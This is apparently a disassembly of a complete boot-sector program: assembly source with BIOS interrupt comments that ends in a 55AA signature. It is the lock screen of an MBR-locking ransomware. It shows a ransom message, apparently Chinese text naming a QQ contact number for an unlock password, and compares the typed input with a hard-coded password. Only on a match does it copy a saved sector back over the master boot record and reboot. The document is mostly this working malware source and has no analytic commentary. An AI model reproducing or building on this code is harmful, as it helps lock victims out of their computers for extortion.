                .x64p 
		.model tiny

; ===========================================================================

; Segment type:	Pure code
RealCode segment byte use16 

start:					; CODE XREF: seg000:00B3j
		mov	ax, cs
		mov	ds, ax
		mov	ss, ax
		mov	es, ax
		mov	sp, 100h
		mov	bp, 7CBFh
		mov	cx, 29h	; ')'
		mov	ax, 1301h
		mov	bx, 0Ch
		mov	dl, 0
		int	10h		; - VIDEO - WRITE STRING (AT,XT286,PS,EGA,VGA)
					; AL = mode, BL	= attribute if AL bit 1	clear, BH = display page number
					; DH,DL	= row,column of	starting cursor	position, CX = length of string
					; ES:BP	-> start of string
		mov	ax, 0B800h
		add	ax, 0A0h ; '?
		mov	ds, ax
		assume ds:nothing
		xor	cx, cx
		xor	bx, bx

GetKey:					; CODE XREF: seg000:003Fj seg000:004Bj
		xor	ax, ax
		int	16h		; KEYBOARD - READ CHAR FROM BUFFER, WAIT IF EMPTY
					; Return: AH = scan code, AL = character
		cmp	al, 8		; backspace
		jz	short PressBackspace
		cmp	al, 0Dh		; enter
		jz	short CheckPassword
		mov	ah, 2
		mov	[bx], al
		mov	[bx+1],	ah
		add	bx, 2
		inc	cx
		jmp	GetKey		; DATA XREF: seg000:0019r
; ---------------------------------------------------------------------------

PressBackspace:				; CODE XREF: seg000:002Dj
		sub	bx, 2
		dec	cx
		xor	ax, ax
		mov	[bx], ax
		jmp	GetKey		; DATA XREF: seg000:0084r seg000:0094r
; ---------------------------------------------------------------------------

CheckPassword:				; CODE XREF: seg000:0031j
		mov	ax, cs
		mov	es, ax
		xor	bx, bx
		mov	si, 7CE9h
		mov	cl, byte ptr cs:word_7CE8 ; DATA XREF: seg000:0029r
		mov	ch, 0

loc_5E:					; CODE XREF: seg000:006Dj
		db	3Eh
		mov	al, [bx]
		mov	ah, es:[si]
		cmp	al, ah
		jnz	short NotMatch
		add	bx, 2
		inc	si
		loop	loc_5E
		xor	ax, ax		; password match
		mov	ax, 7E00h
		mov	es, ax
		assume es:nothing
		xor	bx, bx
		mov	ah, 2
		mov	dl, 80h	; '€'
		mov	al, 1
		mov	dh, 0
		mov	ch, 0
		mov	cl, 3
		int	13h		; DISK - READ SECTORS INTO MEMORY
					; AL = number of sectors to read, CH = track, CL = sector
					; DH = head, DL	= drive, ES:BX -> buffer to fill
					; Return: CF set on error, AH =	status,	AL = number of sectors read
		xor	bx, bx
		mov	dl, 80h	; '€'
		mov	ah, 3
		mov	al, 1
		mov	dh, 0
		mov	ch, 0
		mov	cl, 1
		int	13h		; DISK - WRITE SECTORS FROM MEMORY
					; AL = number of sectors to write, CH =	track, CL = sector
					; DH = head, DL	= drive, ES:BX -> buffer
					; Return: CF set on error, AH =	status,	AL = number of sectors written
		jmp	ReturnToBiosToRestart
; ---------------------------------------------------------------------------

NotMatch:				; CODE XREF: seg000:0066j
		mov	bx, 0B800h
		add	bx, 29h	; ')'
		mov	al, 58h	; 'X'
		mov	[bx], al
		mov	cx, cs:word_7CE8
		xor	ax, ax

loc_AB:					; CODE XREF: seg000:00B1j
		mov	[bx], ax
		add	bx, 2
		loop	loc_AB
		jmp	start
; ---------------------------------------------------------------------------

ReturnToBiosToRestart:			; CODE XREF: seg000:0096j
		mov	ax, 0FFFFh	; return to bios startup
		push	ax
		mov	ax, 0
		push	ax
		retf
; ---------------------------------------------------------------------------
		db 0C7h	; ?
		db 0EBh	; ?
		db 0C4h	; ?
		db 0FAh	; ?
		db 0C1h	; ?
		db 0AAh	; ?
		db 0CFh	; ?
		db 0B5h	; ?
		db  71h	; q
		db  71h	; q
		db 0A3h	; ?
		db 0BAh	; ?
		db  32h	; 2
		db  36h	; 6
		db  37h	; 7
		db  32h	; 2
		db  34h	; 4
		db  36h	; 6
		db  31h	; 1
		db  35h	; 5
		db  33h	; 3
		db  38h	; 8
		db 0A3h	; ?
		db 0ACh	; ?
		db  20h
		db 0BBh	; ?
		db 0F1h	; ?
		db 0B5h	; ?
		db 0C3h	; ?
		db 0BDh	; ?
		db 0E2h	; ?
		db 0CBh	; ?
		db 0F8h	; ?
		db 0C3h	; ?
		db 0DCh	; ?
		db 0C2h	; ?
		db 0EBh	; ?
		db 0A3h	; ?
		db 0A1h	; ?
		db  20h
		db  2Eh	; .
		db  12h			; length
		db  41h	; A		; pssword
		db  44h	; D
		db  33h	; 3
		db  37h	; 7
		db  62h	; b
		db  39h	; 9
		db  30h	; 0
		db  43h	; C
		db  37h	; 7
		db  33h	; 3
		db  30h	; 0
		db  37h	; 7
		db  4Eh	; N
		db  6Fh	; o
		db  53h	; S
		db  49h	; I
		db  71h	; q
		db  31h	; 1
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  0Fh
		db  55h	; U
		db 0AAh	; ?
RealCode ends

end start 